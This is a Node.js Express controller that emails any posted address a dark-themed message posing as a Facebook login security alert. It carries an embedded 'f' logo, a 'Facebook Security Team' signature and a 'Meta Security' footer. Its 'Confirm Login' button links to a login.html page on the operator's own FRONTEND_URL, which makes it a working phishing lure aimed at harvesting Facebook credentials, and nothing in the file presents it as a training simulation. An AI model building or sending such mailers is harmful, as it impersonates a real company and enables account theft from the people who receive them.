const sendEmail = require("../services/emailService");

exports.sendLoginEmail = async (req, res) => {
  try {
    const { email, name = "User" } = req.body;

    if (!email) {
      return res.status(400).json({ success: false, message: "Email required" });
    }

    // ✅ FIXED FRONTEND LINK (NO MORE ROOT REDIRECT)
    const baseUrl = process.env.FRONTEND_URL;
    if (!baseUrl) {
      console.error("FRONTEND_URL missing");
      return res.status(500).json({ success: false, message: "Server config error" });
    }

    const loginLink = `${baseUrl.replace(/\/$/, "")}/login.html`;

    console.log("🔗 Login Link:", loginLink);

    const device = req.headers["user-agent"] || "Unknown Device";
    const time = new Date().toLocaleString();

    // 🔥 PREMIUM EMAIL TEMPLATE
    const html = `
<!DOCTYPE html>
<html>
<body style="margin:0;padding:0;background:#121212;font-family:Arial, sans-serif;">

<div style="max-width:480px;margin:auto;padding:20px;background:#121212;color:#e4e6eb;">

    <!-- 🔵 f LOGO (IMAGE + FALLBACK) -->
    <div style="display:flex;align-items:center;gap:10px;">
        
        <!-- Embedded Image -->
        <img src="cid:f_logo" alt="f Logo" width="42" height="42"
             style="border-radius:50%;display:block;">

        <!-- Fallback text (if image blocked) -->
        <div style="
            width:42px;
            height:42px;
            background:#0866ff;
            border-radius:50%;
            display:flex;
            align-items:center;
            justify-content:center;
            font-weight:bold;
            color:#fff;
            font-size:18px;
        ">
            f
        </div>

    </div>

    <hr style="border:0;border-top:1px solid #3e4042;margin:20px 0;">

    <p style="font-size:16px;">Hi ${name},</p>

    <p style="font-size:15px;line-height:1.5;">
        We noticed a login attempt to your Facebook Security account.
    </p>

    <b style="font-size:17px;color:#ffffff;">About this login</b>

    <table width="100%" style="margin-top:15px;color:#b0b3b8;font-size:14px;">
        <tr>
            <td width="30">🕒</td>
            <td>${time}</td>
        </tr>
        <tr>
            <td>📍</td>
            <td>Unknown Location</td>
        </tr>
        <tr>
            <td>📱</td>
            <td>${device}</td>
        </tr>
    </table>

    <!-- ✅ WORKING BUTTON -->
    <a href="${loginLink}"
       style="
       display:block;
       width:100%;
       background:#2374e1;
       color:#ffffff !important;
       text-align:center;
       padding:14px 0;
       border-radius:8px;
       text-decoration:none;
       font-weight:600;
       font-size:16px;
       margin:25px 0;">
       Confirm Login
    </a>

    <p style="font-size:14px;">
        If this wasn’t you, please secure your account immediately.
    </p>

    <p style="margin-top:20px;">
        Thanks,<br>
        <strong>Facebook Security Team</strong>
    </p>

    <hr style="border:0;border-top:1px solid #3e4042;margin:20px 0;">

    <div style="text-align:center;font-size:12px;color:#b0b3b8;">
        <p>© 2026 Meta Security</p>
        <p>This message was sent to ${email}</p>
        <p>Please do not forward this email.</p>
    </div>

</div>

</body>
</html>
`;

    // ✅ SEND WITH EMBEDDED LOGO
    const sent = await sendEmail({
      to: email,
      subject: "🔐 Security Alert - Confirm Your Login",
      html,
      attachments: [
        {
          filename: "f-logo.png",
          path: "./public/f-logo.png", // 👉 YOU MUST ADD THIS FILE
          cid: "f_logo",
        },
      ],
    });

    if (!sent) {
      return res.status(500).json({ success: false, message: "Email failed" });
    }

    return res.status(200).json({ success: true, message: "Email sent" });

  } catch (err) {
    console.error("EMAIL ERROR:", err);
    return res.status(500).json({ success: false, message: "Server error" });
  }
};